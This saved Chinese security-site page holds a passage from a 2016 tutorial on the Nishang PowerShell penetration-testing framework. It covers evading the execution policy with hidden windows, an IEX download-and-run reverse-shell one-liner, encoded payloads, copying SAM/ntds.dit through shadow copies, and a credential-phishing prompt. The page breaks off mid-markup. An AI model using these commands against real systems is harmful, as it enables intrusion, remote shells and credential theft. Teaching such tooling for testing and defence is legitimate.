<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】Powershell 渗透测试工具-Nishang（二） - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="NIshang,powershell,渗透测试,内网渗透"/>
    
        <meta name="description" content="利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】Powershell 渗透测试工具-Nishang（二）</h2>
                <div class="article-msg">
                    <span class="time">2016-11-18 13:54:09</span>
                    
                                        <span class="read">阅读：27734次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3200"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3200" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 安全客</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2665001095" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01c95a4f891e360359.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2665001095" style="color:#848e99;">V1ct0r</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><img src="http://p0.qhimg.com/t014150d112bea7d3f8.png" alt="http://p5.qhimg.com/t014034b9dcf5c9e75b.png"/></span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">作者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2665001095" target="_blank" textvalue="V1ct0r" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>V1ct0r</strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">稿费：500RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆</span></strong></span><a href="http://bobao.360.cn/contribute/index" target="_blank" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在线投稿</span></strong></span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-size: 18px;"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">传送门</span></strong></span></p><hr/><p style="text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3182.html" target="_blank" style="text-indent: 2em; text-decoration: none;"><span style="font-size: 18px; color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">【技术分享】Powershell 渗透测试工具-Nishang（一）</span></strong></span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x00 介绍</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">Powershell用于渗透测试其实早在多年前就已经被提出了。<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。</span>它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。至今，Nishang最新版本已为v0.67了。本文我将具体介绍这款实用的Powershell渗透测试工具。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x01 使用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">要使用Nishang，我们首先需要在</span><a href="https://github.com/samratashok/nishang" target="_blank" textvalue="[作者的Github]" style="text-decoration: none;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">[作者的Github]</span></a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上面下载它，之后加载这些脚本。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Nishang需要我们的Powershell版本在v3以上才能使用，这里顺便提供两种查看当前我们当前Powershell版本的方法:&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.直接在我们的Powershell下执行”get-host”命令：&nbsp;</span></strong></span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t01968fe43017bd6791.jpg" title="t0174aabb5199bc3dcd.jpg" alt="http://p7.qhimg.com/t0174aabb5199bc3dcd.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.我们还可以在Powershell下执行”$PSVersionTable.PSVersion”：&nbsp;</span></strong></span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t0136d6c6de72d96888.jpg" title="t01e2de2a01b2df6d75.jpg" alt="http://p4.qhimg.com/t01e2de2a01b2df6d75.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要知道的是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">默认情况下的Server&nbsp;OS&nbsp;对应的&nbsp;Powershell的版本：
Windows&nbsp;2008&nbsp;R2&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;Version&nbsp;2
Windows&nbsp;2012&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;Version&nbsp;3
Windows&nbsp;2012&nbsp;R2&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;Version&nbsp;4
Windows&nbsp;2016&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;Version&nbsp;5</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们需要加载我们的脚本：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;Import-Module&nbsp;.\nishang.psm1</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你可能会遇到下面的问题：&nbsp;</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t01f26d6b3b94f6a287.jpg" title="t013d3c74fc20686b62.jpg" alt="http://p2.qhimg.com/t013d3c74fc20686b62.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是因为我们Powershell的默认的执行策略是Restricted的，而Restricted是不允许任何脚本运行的，我们可以使用下面的命令来来查看当前的执行策略：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;Get-ExecutionPolicy</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里我们需要将执行模式改为RemoteSigned，这样就可以执行其他用户的脚本了：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;set-executionpolicy&nbsp;remotesigned&nbsp;//这需要在管理员的状态下执行</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们就可以正常进行加载了。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，上面是基于我们在本地进行测试的情况下，如果是在真实的攻击场景之下，我们还是不宜去做一些全局策略的更改的，这里简单推荐几个Bypass执行策略的Tricks：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0.&nbsp;Set-ExecutionPolicy&nbsp;-Scope&nbsp;CurrentUser&nbsp;-ExecutionPolicy&nbsp;Unrestricted&nbsp;//设置当前用户的执行策略为Unrestricted，也算是去更改了当前的全局策略
1.&nbsp;powershell.exe&nbsp;-executionpolicy&nbsp;bypass&nbsp;-Windowstyle&nbsp;hidden&nbsp;-noninteractive&nbsp;-nologo&nbsp;-File&nbsp;//或是下面这种，-Windowstyle&nbsp;hidden&nbsp;可以让我们的执行无任何弹窗
2.&nbsp;PowerShell.exe&nbsp;-ExecutionPolicy&nbsp;Bypass&nbsp;-File</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">想了解更多姿势，大家可以看看Bypass执行策略的十五种方法：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/" _src="https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/">https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后，我们使用Dot Sourcing的方式来加载独立的脚本：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;.&quot;D:\nishang-master\Gather\Get-Information.ps1&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在之后的使用中，我们可以使用”Get-Help”命令来获取当前脚本的用法和说明等，如：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;.&quot;D:\nishang-master\Gather\Get-WLAN-Keys.ps1
PS&nbsp;D:\nishang-master&gt;&nbsp;Get-Help&nbsp;Get-Wlan-Keys</pre><p style="text-align:center"><img src="http://p4.qhimg.com/t01ad06705f088b92ac.jpg" title="t013508b17e3145aec3.jpg" alt="http://p1.qhimg.com/t013508b17e3145aec3.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还需要说的一点是，我们可以在Powershell中使用” Out-File”来将我们的执行结果导出到文件中，如：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;Get-Information&nbsp;|&nbsp;Out-File&nbsp;res.txt</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">就可以把获取到的信息保存在res.txt中了。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最后，需要介绍两种在内存当中去加载脚本的方式&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一种：</span></p><pre class="brush:plain;toolbar:false">powershell&nbsp;iex&nbsp;(New-Object&nbsp;Net.WebClient).DownloadString(&#39;http:///Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp&nbsp;-Reverse&nbsp;-IPAddress&nbsp;[IP]&nbsp;-Port&nbsp;[PortNo.]&nbsp;//</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里IEX可以远程下载我们的脚本</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第二种，我们可以在Powershell中使用Invoke-Encode脚本来将我们现有的脚本编码压缩，生成编码后的内容，过程如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;D:\nishang-master&gt;&nbsp;Invoke-Encode&nbsp;-DataToEncode&nbsp;&quot;D:\nishang-master\Shells\Invoke-PowerShellTcp.ps1&quot;&nbsp;-OutCommand
Encoded&nbsp;data&nbsp;written&nbsp;to&nbsp;.\encoded.txt
Encoded&nbsp;command&nbsp;written&nbsp;to&nbsp;.\encodedcommand.txt</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在我们的encodedcommand.txt文件中我们可以看到编码后的内容和效果：&nbsp;</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t010bb1dc3dd80fad70.jpg" title="t01bdaf5e1a9ab9830c.jpg" alt="http://p5.qhimg.com/t01bdaf5e1a9ab9830c.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后在目标上(Web shell,meterpreter native shell等都可以)使用如下命令执行：</span></p><pre class="brush:plain;toolbar:false">C:\Users\target&gt;&nbsp;powershell&nbsp;-e&nbsp;[encodedscript]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这里涉及到的Invoke-PowerShellTcp脚本，我们将在后文对于具体模块的脚本介绍时谈到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x02 模块介绍</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">0.信息搜集</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Check-VM</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从这个脚本的名字就可以看出来，它是用于检测当前的机器是否是一台已知的虚拟机的。它通过检测已知的一些虚拟机的指纹信息（如：Hyper-V, VMWare, Virtual PC, Virtual Box,Xen,QEMU）来识别。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Check-VM</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试</span></p><p style="text-align:center"><img src="http://p1.qhimg.com/t01236745b37285e83b.jpg" title="t01de842df92ec8ac01.jpg" alt="http://p9.qhimg.com/t01de842df92ec8ac01.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Copy-VSS</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本利用Volume Shadow Copy 服务来复制出SAM文件。如果这个脚本运行在了DC机上ntds.dit和SYSTEM hive也能被拷贝出来。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Copy-VSS&nbsp;//将会直接把文件保存在当前路径下
PS&nbsp;&gt;&nbsp;Copy-VSS&nbsp;-DestinationDir&nbsp;C:\temp&nbsp;&nbsp;//指定保存文件的路径（必须是已经存在的路径）</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t0138c8a7a7976f5293.jpg" title="t011278a7d953361833.jpg" alt="http://p1.qhimg.com/t011278a7d953361833.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">Invoke-CredentialsPhish</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个脚本是用来欺骗用户输入账号密码信息的。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;Invoke-CredentialsPhish</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">测试</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t019ccfefe441016dc3.jpg" title="t01ebc9a71ca3930b4d.jpg" alt="http://p2.qhimg.com/t01ebc9a71ca3930b4d.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行后会弹出这个框欺骗用户输入&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">直到用户输入正确后这个框才会消失，然后我们就可以得到明文的管理员账号密码：</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t015c212478037bb661.jpg" title="t019564c00d489f7c2c.jpg" alt="http://p3.qhimg.com/t019564c00d489f7c2c.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 176, 80);">FireBuster FireListener</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">FireBuster可以对内网进行扫描，它会把包发给FireListener&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">执行方式：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">PS&nbsp;&gt;&nbsp;FireBuster&nbsp;10.10.10.10&nbsp;1000-1020
PS&nbsp;&gt;&nbsp;FireListener&nbsp;-portrange&nbsp;1000-1020</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">该脚本作者的Github上面还提供了一个Python版的监听端：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/" _src="https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/">https://github.com/roo7break/PowerShell-Scripts/blob/master/FireBuster/</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">测试&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们首先在我们的机器（Attacker）上面运行FireListener：</span></p><pre class="brush:plain;toolbar:false">FireListener&nbsp;100-110</pre><p style="text-align:center"><img src="http://p5.qhimg.com/t01bf396dcdcab17102.jpg" title="t01ad16795412c5d79d.jpg" alt="http://p9.qhimg.com/t01ad16795412c5d79d.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Victim：</span></p><pre 